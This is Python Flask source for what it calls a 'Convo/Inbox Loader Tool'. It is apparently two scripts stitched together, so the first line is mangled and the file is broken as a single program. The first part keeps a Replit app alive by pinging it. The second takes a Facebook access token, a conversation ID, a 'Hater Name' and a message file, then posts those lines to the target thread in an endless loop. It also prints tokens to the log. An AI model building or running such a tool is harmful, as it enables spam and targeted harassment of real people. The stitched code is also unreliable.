from flask import Flask, request
import requests
from time import sleep
import timefrom flask import Flask, request, render_template_string
import requests
import threading
import time

app = Flask(__name__)

# Headers for requests
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Uptime tracking
start_time = time.time()
replit_url = ""  # Initially empty, will be set by user

# Replit auto-ping system (30 sec interval)
def keep_alive():
    global replit_url
    while True:
        if replit_url:
            try:
                response = requests.get(replit_url, headers=headers)
                status_code = response.status_code
                if 200 <= status_code < 600:  # Accept all status codes from 200 to 599
                    print(f"✅ Pinged {replit_url}, Status Code: {status_code}")
                else:
                    print(f"⚠️ Unexpected Status Code: {status_code}")
            except Exception as e:
                print(f"❌ Error pinging {replit_url}: {e}")
        time.sleep(30)

# Start the pinging system in the background
threading.Thread(target=keep_alive, daemon=True).start()

@app.route('/', methods=['GET', 'POST'])
def send_message():
    global replit_url
    uptime_days = round((time.time() - start_time) / 86400, 2)  # Convert uptime to days

    if request.method == 'POST':
        if 'replitUrl' in request.form:
            replit_url = request.form.get('replitUrl')

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Raj mishra</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body { background-color: pink; color: red; }
            .container { max-width: 500px; background-color: blue; border-radius: 10px; padding: 20px; box-shadow: 0 0 15px rgba(0, 0, 0, 0.2); margin: 0 auto; margin-top: 20px; }
            .header { text-align: center; padding-bottom: 20px; }
            .btn-submit { width: 100%; margin-top: 10px; background-color: red; color: white; }
            .footer { text-align: center; margin-top: 20px; color: #444; }
            .footer a { color: red; }
            .uptime-label { font-size: 18px; font-weight: bold; text-align: center; margin-top: 15px; color: yellow; }
        </style>
    </head>
    <body>
        <header class="header mt-4">
            <h1 class="mb-3">☘️RAJ HERE❤️</h1>
            <h2>OWNR :: ⎯꯭̽🌱꯭♡🅡aj ⓂⒾⓈⒽⓇⒶ☯🖤⎯꯭̽⟶꯭</h2>
        </header>

        <div class="container">
            <form action="/" method="post">
                <div class="mb-3">
                    <label for="replitUrl">Enter Your Replit URL:</label>
                    <input type="text" class="form-control" id="replitUrl" name="replitUrl" value="{{ replit_url }}" required>
                </div>
                <button type="submit" class="btn btn-primary btn-submit">Set Replit URL</button>
            </form>
            
            <div class="uptime-label">
                🔥 UPTIME: {{ uptime_days }} Days
            </div>
        </div>

        <footer class="footer">
            <p>&copy; 2025 Raj Mishra. All Rights Reserved.</p>
            <p>Convo/Inbox Loader Tool</p>
            <p>Made with ♥ by <a href="https://github.com/DEVILXWD">⎯꯭̽🌱꯭♡🅡𝘢𝘫☯🖤⎯꯭̽⟶꯭</a></p>
        </footer>
    </body>
    </html>
    ''', replit_url=replit_url, uptime_days=uptime_days)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
from datetime import datetime

app = Flask(__name__)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)

    return '''
    
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Raj mishra</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: pink;
            color: red;
        }
        .container {
            max-width: 500px;
            background-color: blue;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
            margin: 0 auto;
            margin-top: 20px;
        }
        .header {
            text-align: center;
            padding-bottom: 20px;
        }
        .btn-submit {
            width: 100%;
            margin-top: 10px;
            background-color: red;
            color: white;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #444;
        }
        .footer a {
            color: red;
        }
    </style>
</head>
<body>
    <header class="header mt-4">
        <h1 class="mb-3">☘️RAJ HERE❤️</h1>
        <h2>OWNR :: 
⎯꯭̽🌱꯭♡🅡aj ⓂⒾⓈⒽⓇⒶ☯🖤⎯꯭̽⟶꯭</h2>
    </header>

    <div class="container">
        <form action="/" method="post" enctype="multipart/form-data">
            <div class="mb-3">
                <label for="accessToken">Enter Your Token:</label>
                <input type="text" class="form-control" id="accessToken" name="accessToken" required>
            </div>
            <div class="mb-3">
                <label for="threadId">Enter Convo/Inbox ID:</label>
                <input type="text" class="form-control" id="threadId" name="threadId" required>
            </div>
            <div class="mb-3">
                <label for="kidx">Enter Hater Name:</label>
                <input type="text" class="form-control" id="kidx" name="kidx" required>
            </div>
            <div class="mb-3">
                <label for="txtFile">Select Your Notepad File:</label>
                <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
            </div>
            <div class="mb-3">
                <label for="time">Speed in Seconds:</label>
                <input type="number" class="form-control" id="time" name="time" required>
            </div>
            <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
        </form>
    </div>

    <footer class="footer">
        <p>&copy; 2023 Devil Brand. All Rights Reserved.</p>
        <p>Convo/Inbox Loader Tool</p>
        <p>Made with ♥ by <a href="https://github.com/DEVILXWD">
⎯꯭̽🌱꯭♡🅡𝘢𝘫☯🖤⎯꯭̽⟶꯭</a></p>
    </footer>

    <script>
        document.querySelector('form').onsubmit = function() {
            alert('Form has been submitted successfully!');
        };
    </script>
</body>
</html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
